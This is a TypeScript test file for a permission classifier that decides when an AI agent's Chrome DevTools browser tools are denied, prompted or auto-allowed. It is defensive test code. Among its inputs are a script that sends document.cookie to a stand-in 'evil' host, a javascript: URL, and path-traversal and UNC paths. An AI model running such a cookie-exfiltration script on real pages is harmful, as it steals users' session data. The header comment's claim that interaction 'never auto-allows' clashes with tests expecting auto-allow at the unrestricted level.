// Trylo Desktop — Chrome DevTools MCP risk classifier tests.
//
// Spec TRYLO-CORE-AGENT-TOOL-EXTENSION-TECHNICAL-SPEC §6.5 × §6.3 × §4.1
// (work.browser-debug.v1) — PR-7. Pinned here:
//   - reads auto at every level; explicit file writes follow the §6.3 write
//     rules (the pinned server bounds them to the OS temp dir);
//   - evaluate_script is bypass-immune (always approval);
//   - navigation follows the §6.5 origin flow with the SHARED origin lease
//     (same store instance as the playwright classifier);
//   - interaction never auto-allows (opaque uids — effects indeterminable);
//   - uploads must stay inside the workspace (local data out = sensitive);
//   - every pinned tool produces a decision — none falls to unknown_tool.

import { describe, expect, it } from 'vitest';

import {
  CHROME_DEVTOOLS_EXPECTED_TOOLS,
  CHROME_DEVTOOLS_LEASE_TTL_MS,
  CHROME_DEVTOOLS_SERVER_NAME,
  CHROME_DEVTOOLS_TOOL_NAMES,
  buildChromeDevtoolsApprovalPreview,
  classifyChromeDevtoolsTool,
} from './chrome-devtools-classifier';
import { BrowserOriginLeases } from './playwright-classifier';
import type { ToolRiskContext } from '../tool-risk-classifier';
import type { PermissionLevel } from '../../permission/permission-policy';

const ALL_LEVELS: readonly PermissionLevel[] = [
  'read_only',
  'ask',
  'workspace_write',
  'unrestricted',
];

function ctx(
  tool: string,
  input: Record<string, unknown> = {},
  level: PermissionLevel = 'workspace_write',
  at = 1_000,
  conversationId = 'conv-1',
): ToolRiskContext {
  return {
    profileId: 'work.browser-debug.v1',
    packageId: 'chrome-devtools',
    toolName: `mcp__${CHROME_DEVTOOLS_SERVER_NAME}__${tool}`,
    input,
    permissionLevel: level,
    projectRoot: 'D:/work/proj',
    conversationId,
    at,
  };
}

function leased(at = 1_000): BrowserOriginLeases {
  const leases = new BrowserOriginLeases();
  leases.grant(
    { kind: 'browser-origin', origin: 'https://example.com', actionClass: 'navigate', conversationId: 'conv-1', ttlMs: CHROME_DEVTOOLS_LEASE_TTL_MS },
    at,
  );
  return leases;
}

describe('pinned surface (PR-7)', () => {
  it('exposes exactly the 29 recorded tools with the trylo-chrome prefix', () => {
    expect(CHROME_DEVTOOLS_TOOL_NAMES).toHaveLength(29);
    expect(CHROME_DEVTOOLS_EXPECTED_TOOLS).toHaveLength(29);
    for (const full of CHROME_DEVTOOLS_EXPECTED_TOOLS) {
      expect(full.startsWith(`mcp__${CHROME_DEVTOOLS_SERVER_NAME}__`)).toBe(true);
    }
  });

  it('every pinned tool produces a decision — none is unknown_tool', () => {
    for (const tool of CHROME_DEVTOOLS_TOOL_NAMES) {
      for (const level of ALL_LEVELS) {
        const input = tool === 'navigate_page' || tool === 'new_page'
          ? { url: 'https://example.com/' }
          : {};
        const route = classifyChromeDevtoolsTool(ctx(tool, input, level));
        expect(route.reasonCode ?? '').not.toBe('unknown_tool');
      }
    }
  });
});

describe('reads (§6.5 auto)', () => {
  const READS = [
    ['list_pages', {}],
    ['select_page', { pageId: 0 }],
    ['wait_for', { text: 'ready' }],
    ['get_console_message', {}],
    ['list_console_messages', {}],
    ['list_network_requests', {}],
    ['performance_analyze_insight', { insightName: 'LCP' }],
    ['resize_page', { width: 1280, height: 720 }],
  ] as const;

  it('auto-allow at every level without a path param', () => {
    for (const [tool, input] of READS) {
      for (const level of ALL_LEVELS) {
        const route = classifyChromeDevtoolsTool(ctx(tool, { ...input }, level));
        expect(route.behavior, `${tool}@${level}`).toBe('auto_allow');
      }
    }
  });

  it('inline screenshots/snapshots/network bodies are reads', () => {
    for (const tool of ['take_snapshot', 'take_screenshot', 'get_network_request']) {
      const route = classifyChromeDevtoolsTool(ctx(tool, {}, 'workspace_write'));
      expect(route.behavior).toBe('auto_allow');
    }
  });
});

describe('file writes (pinned server bounds them to OS temp — §6.3 write rules)', () => {
  const CASES: [string, Record<string, unknown>][] = [
    ['take_screenshot', { filePath: 'shot.png' }],
    ['take_snapshot', { filePath: 'snap.yml' }],
    ['get_network_request', { requestId: 'r1', requestFilePath: 'req.bin', responseFilePath: 'res.bin' }],
    ['take_heapsnapshot', { filePath: 'heap.heapsnapshot' }],
  ];

  it('read_only denies file writes outright', () => {
    for (const [tool, input] of CASES) {
      const route = classifyChromeDevtoolsTool(ctx(tool, input, 'read_only'));
      expect(route.behavior, tool).toBe('deny');
      expect(route.reasonCode).toBe('file_write_denied_read_only');
    }
  });

  it('ask / workspace_write approve', () => {
    for (const [tool, input] of CASES) {
      for (const level of ['ask', 'workspace_write'] as const) {
        const route = classifyChromeDevtoolsTool(ctx(tool, input, level));
        expect(route.behavior, `${tool}@${level}`).toBe('prompt');
        expect(route.reasonCode).toBe('file_write_requires_approval');
      }
    }
  });

  it('unrestricted auto-allows the bounded write', () => {
    for (const [tool, input] of CASES) {
      const route = classifyChromeDevtoolsTool(ctx(tool, input, 'unrestricted'));
      expect(route.behavior, tool).toBe('auto_allow');
      if (route.behavior === 'auto_allow') {
        expect(route.risk).toBe('workspace-write');
      }
    }
  });

  it('lexical path defense: .. / UNC / device / drive-relative deny at every level', () => {
    const bad: string[] = [
      '../outside.png',
      'a/../b.png',
      '//server/share/shot.png',
      '//./Device/shot.png',
      'C:shot.png',
      'C:/x/CON.png',
    ];
    for (const value of bad) {
      const route = classifyChromeDevtoolsTool(ctx('take_screenshot', { filePath: value }, 'unrestricted'));
      expect(route.behavior, value).toBe('deny');
    }
  });
});

describe('evaluate_script (§6.5: 始终审批, bypass-immune)', () => {
  it('never auto-allows at any level', () => {
    for (const level of ALL_LEVELS) {
      const route = classifyChromeDevtoolsTool(ctx('evaluate_script', { expression: 'document.cookie' }, level));
      if (level === 'read_only') {
        expect(route.behavior).toBe('deny');
      } else {
        expect(route.behavior, level).toBe('prompt');
        expect(route.reasonCode).toBe('evaluate_requires_approval');
      }
    }
  });

  it('a filePath ride-along never upgrades the approval to a write auto-allow', () => {
    // Code execution dominates the file-write rule (§6.5: evaluate is
    // bypass-immune — the script could write anywhere through the page).
    const read_only = classifyChromeDevtoolsTool(ctx('evaluate_script', { expression: '1+1', filePath: 'out.txt' }, 'read_only'));
    expect(read_only.behavior).toBe('deny');
    expect(read_only.reasonCode).toBe('code_denied_read_only');
    for (const level of ['ask', 'workspace_write', 'unrestricted'] as const) {
      const route = classifyChromeDevtoolsTool(ctx('evaluate_script', { expression: '1+1', filePath: 'out.txt' }, level));
      expect(route.behavior, level).toBe('prompt');
      expect(route.reasonCode).toBe('evaluate_requires_approval');
    }
  });
});

describe('navigation (§6.5 origin flow, shared lease store)', () => {
  it('first visit at workspace_write approves AND grants the origin lease', () => {
    const route = classifyChromeDevtoolsTool(ctx('navigate_page', { url: 'https://example.com/page?token=x' }, 'workspace_write'));
    expect(route.behavior).toBe('prompt');
    if (route.behavior === 'prompt') {
      expect(route.reasonCode).toBe('navigate_new_origin');
      expect(route.lease?.kind).toBe('browser-origin');
      if (route.lease?.kind === 'browser-origin') {
        expect(route.lease.origin).toBe('https://example.com');
      }
    }
  });

  it('a live lease (granted via playwright or here) auto-allows the same origin', () => {
    const leases = leased();
    const route = classifyChromeDevtoolsTool(ctx('navigate_page', { url: 'https://example.com/other' }, 'workspace_write'), { leases });
    expect(route.behavior).toBe('auto_allow');
    expect(route.reasonCode).toBe('origin_leased');
  });

  it('read_only / ask approve without a lease; unrestricted auto', () => {
    const readOnly = classifyChromeDevtoolsTool(ctx('navigate_page', { url: 'https://example.com/' }, 'read_only'));
    expect(readOnly.behavior).toBe('prompt');
    const ask = classifyChromeDevtoolsTool(ctx('navigate_page', { url: 'https://example.com/' }, 'ask'));
    expect(ask.behavior).toBe('prompt');
    const unrestricted = classifyChromeDevtoolsTool(ctx('navigate_page', { url: 'https://example.com/' }, 'unrestricted'));
    expect(unrestricted.behavior).toBe('auto_allow');
  });

  it('invalid schemes and credential URLs deny; blocked origins deny', () => {
    for (const url of ['file:///C:/x', 'javascript:alert(1)', 'https://user:pass@example.com/']) {
      const route = classifyChromeDevtoolsTool(ctx('navigate_page', { url }, 'unrestricted'));
      expect(route.behavior, url).toBe('deny');
    }
    const blocked = classifyChromeDevtoolsTool(
      ctx('navigate_page', { url: 'https://tracker.example/' }, 'unrestricted'),
      { blockedOrigins: ['https://tracker.example'] },
    );
    expect(blocked.behavior).toBe('deny');
    expect(blocked.reasonCode).toBe('origin_blocked');
  });

  it('new_page without a url is a blank page (read)', () => {
    const route = classifyChromeDevtoolsTool(ctx('new_page', {}, 'workspace_write'));
    expect(route.behavior).toBe('auto_allow');
  });

  it('close_page is an approval at ask/workspace_write, auto in unrestricted', () => {
    for (const level of ['ask', 'workspace_write'] as const) {
      const route = classifyChromeDevtoolsTool(ctx('close_page', { pageId: 0 }, level));
      expect(route.behavior, level).toBe('prompt');
      expect(route.reasonCode).toBe('page_close');
    }
    expect(classifyChromeDevtoolsTool(ctx('close_page', { pageId: 0 }, 'unrestricted')).behavior).toBe('auto_allow');
  });
});

describe('interaction (never auto — opaque uids)', () => {
  const TOOLS: [string, Record<string, unknown>][] = [
    ['click', { uid: '1-23' }],
    ['drag', { from_uid: '1', to_uid: '2' }],
    ['hover', { uid: '1-9' }],
    ['fill', { uid: '1-4', value: 'hello' }],
    ['fill_form', { fields: {} }],
    ['press_key', { key: 'Enter' }],
    ['type_text', { text: 'hello world' }],
    ['handle_dialog', { action: 'accept' }],
  ];

  it('read_only denies; ask/workspace_write approve, unrestricted auto (A 完全自动)', () => {
    for (const [tool, input] of TOOLS) {
      for (const level of ALL_LEVELS) {
        const route = classifyChromeDevtoolsTool(ctx(tool, input, level));
        if (level === 'read_only') {
          expect(route.behavior, `${tool}@${level}`).toBe('deny');
        } else if (level === 'unrestricted') {
          expect(route.behavior, `${tool}@${level}`).toBe('auto_allow');
        } else {
          expect(route.behavior, `${tool}@${level}`).toBe('prompt');
          expect(route.reasonCode).toBe('interaction_requires_approval');
        }
      }
    }
  });

  it('credential-looking values escalate the reason but never echo them', () => {
    const route = classifyChromeDevtoolsTool(ctx('fill', { uid: '1-4', value: 'hunter2-password' }, 'workspace_write'));
    expect(route.behavior).toBe('prompt');
    expect(route.reasonCode).toBe('credential_value_typed');
    const preview = buildChromeDevtoolsApprovalPreview({
      toolName: `mcp__${CHROME_DEVTOOLS_SERVER_NAME}__fill`,
      input: { uid: '1-4', value: 'hunter2-password' },
    });
    expect(JSON.stringify(preview)).not.toContain('hunter2');
  });
});

describe('upload_file (local data leaving to the page) — A 完全自动下 unrestricted 放行', () => {
  it('workspace-relative and in-workspace absolute paths are sensitive approvals except in unrestricted', () => {
    for (const paths of [['report.pdf'], ['D:/work/proj/docs/spec.pdf']]) {
      const route = classifyChromeDevtoolsTool(ctx('upload_file', { uid: '1-2', filePaths: paths }, 'workspace_write'));
      expect(route.behavior).toBe('prompt');
      expect(route.reasonCode).toBe('uploads_local_file');
      expect(classifyChromeDevtoolsTool(ctx('upload_file', { uid: '1-2', filePaths: paths }, 'unrestricted')).behavior).toBe('auto_allow');
    }
  });

  it('paths outside the workspace or lexically unsafe deny', () => {
    for (const paths of [['D:/elsewhere/secret.pdf'], ['../secret.pdf'], ['//server/share/x.pdf'], ['C:foo.pdf']]) {
      const route = classifyChromeDevtoolsTool(ctx('upload_file', { uid: '1-2', filePaths: paths }, 'unrestricted'));
      expect(route.behavior, paths[0]).toBe('deny');
    }
  });
});

describe('heavy operations (emulate / traces / lighthouse)', () => {
  it('approve at ask / workspace_write, auto at unrestricted', () => {
    for (const tool of ['emulate', 'lighthouse_audit', 'performance_start_trace', 'performance_stop_trace']) {
      const ask = classifyChromeDevtoolsTool(ctx(tool, {}, 'ask'));
      expect(ask.behavior, `${tool}@ask`).toBe('prompt');
      const unrestricted = classifyChromeDevtoolsTool(ctx(tool, {}, 'unrestricted'));
      expect(unrestricted.behavior, `${tool}@unrestricted`).toBe('auto_allow');
    }
  });
});

describe('input hygiene (§6.2/§14.2)', () => {
  it('a non-record input is a hard deny', () => {
    const route = classifyChromeDevtoolsTool(ctx('click', null as unknown as Record<string, unknown>));
    expect(route.behavior).toBe('deny');
    expect(route.reasonCode).toBe('malformed_input');
  });

  it('oversized inputs are never auto except in unrestricted (A 完全自动放行)', () => {
    const route = classifyChromeDevtoolsTool(ctx('click', { uid: 'x'.repeat(300 * 1024) }, 'workspace_write'));
    expect(route.behavior).toBe('prompt');
    expect(route.reasonCode).toBe('input_too_large');
    expect(classifyChromeDevtoolsTool(ctx('click', { uid: 'x'.repeat(300 * 1024) }, 'unrestricted')).behavior).toBe('auto_allow');
  });
});

describe('safe preview (§6.2 redaction)', () => {
  it('never echoes script text, typed values or dialog payloads', () => {
    const cases: [string, Record<string, unknown>][] = [
      ['evaluate_script', { expression: 'fetch("http://evil", {body: document.cookie})' }],
      ['fill', { uid: '1-4', value: 'super-secret' }],
      ['type_text', { text: 'super-secret' }],
      ['handle_dialog', { action: 'accept', promptText: 'super-secret' }],
    ];
    for (const [tool, input] of cases) {
      const preview = buildChromeDevtoolsApprovalPreview({
        toolName: `mcp__${CHROME_DEVTOOLS_SERVER_NAME}__${tool}`,
        input,
      });
      expect(JSON.stringify(preview)).not.toContain('super-secret');
      expect(JSON.stringify(preview)).not.toContain('document.cookie');
      expect(JSON.stringify(preview)).not.toContain('evil');
    }
  });

  it('shows the parsed origin for navigation and the file-write intent', () => {
    const nav = buildChromeDevtoolsApprovalPreview({
      toolName: `mcp__${CHROME_DEVTOOLS_SERVER_NAME}__navigate_page`,
      input: { url: 'https://example.com/page?secret=1' },
    });
    expect(nav.target).toBe('https://example.com');
    const shot = buildChromeDevtoolsApprovalPreview({
      toolName: `mcp__${CHROME_DEVTOOLS_SERVER_NAME}__take_screenshot`,
      input: { filePath: 'shot.png' },
    });
    expect(shot.target).toContain('写文件');
  });

  it('never throws on unexpected input', () => {
    const preview = buildChromeDevtoolsApprovalPreview({
      toolName: `mcp__${CHROME_DEVTOOLS_SERVER_NAME}__click`,
      input: null as unknown as Record<string, unknown>,
    });
    expect(preview.kind).toBe('summary');
  });
});
